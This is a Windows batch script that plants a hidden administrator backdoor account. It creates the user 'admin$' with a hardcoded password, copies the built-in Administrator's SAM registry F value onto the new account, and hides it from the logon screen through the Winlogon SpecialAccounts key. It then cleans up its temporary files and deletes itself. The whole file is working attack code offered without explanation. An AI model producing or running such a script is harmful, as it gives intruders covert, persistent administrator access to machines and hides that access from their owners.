@echo off
set uname=admin$
set pwd=1q2w#E$R1234

net user %uname% %pwd% /add
net localgroup Администраторы %uname% /add

if ERRORLEVEL 0 (
goto ADMIN_F_VALUE
goto APPEND_PATH
goto APPEND_USER_V_value
goto REG_NAMES_FOLDER
goto DEL_USER
) else (echo failure)


:ADMIN_F_VALUE
for /f "delims=" %%i in ('reg query HKLM\SAM\SAM\Domains\Account\Users\000001F4 /V F') do set admin_F_value=%%i
set admin_F_value=%admin_F_value:~23,200%
echo "process 1 success"

:APPEND_PATH
reg query HKLM\SAM\SAM\Domains\Account\Users\ | findstr [A-F0-9][0-9A-F]$ >>paths_xx
for /f "delims=" %%i in (paths_xx) do set APPEND_PATH=%%i
echo "process 2 success"

:APPEND_USER_V_value
for /f "delims=" %%i in ('reg query %APPEND_PATH% /V V') do set USR_V_VALUE=%%i
set USR_V_VALUE=%USR_V_VALUE:~23,20000%
echo "process 3 success"

:REG_NAMES_FOLDER
reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\%uname% 11.reg
echo "process 4 success"

:DEL_USER
net user %uname% /del
reg import 11.reg
reg add %APPEND_PATH% /f /v F /t REG_BINARY /d %admin_F_value%
reg add %APPEND_PATH% /f /v V /t REG_BINARY /d %USR_V_VALUE%
net user %uname% /active:yes
net user %uname% %pwd%
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v %uname% /t REG_DWORD /d 00000000

del /F /S /Q paths_xx
del /F /S /Q 11.reg
echo "process 5 success"

del %0

